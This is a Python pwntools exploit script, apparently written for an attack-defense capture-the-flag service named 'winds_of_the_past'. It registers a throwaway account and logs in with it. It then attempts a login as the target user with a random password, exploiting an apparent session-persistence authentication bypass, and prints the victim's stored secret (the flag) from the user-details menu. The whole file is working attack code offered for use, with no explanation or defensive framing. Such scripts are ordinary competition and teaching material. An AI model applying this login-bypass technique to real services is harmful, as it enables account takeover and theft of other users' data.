#!/usr/bin/env python3
from winds_of_the_past import *

from pwn import *
import re
import sys


def exploit(ip: str, flag_id: str):
    with remote(ip, PORT) as r:
        r.recvuntil(Menu.MENU_END.value)

        # Register user
        username = randoms(20).encode()
        password = randoms(20).encode()
        r.sendline(Menu.REGISTER_USER.value)
        r.sendline(username)
        r.sendline(password)
        r.recvuntil(Menu.MENU_END.value)

        # Login as registered user
        r.sendline(Menu.LOGIN.value)
        r.sendline(username)
        r.sendline(password)
        r.recvuntil(Menu.MENU_END.value)

        # Login as target user
        r.sendline(Menu.LOGIN.value)
        r.sendline(flag_id.encode())
        r.sendline(randoms(20).encode())
        r.recvuntil(Menu.MENU_END.value)

        # Show user details
        r.sendline(Menu.SHOW_USER_DETAILS.value)

        # Parse flag
        user_details = r.recvuntil(Menu.MENU_START.value, drop=True)
        m = re.match(b"User: (.+) / (.+)", user_details)
        if m:
            print(m.group(2).strip().decode())

        # Exit
        r.sendline(Menu.EXIT.value)


if __name__ == "__main__":
    if len(sys.argv) != 3:
        sys.stderr.write(f"Usage: {sys.argv[0]} IP FLAG_ID\n")
        sys.exit(1)

    exploit(sys.argv[1], sys.argv[2])
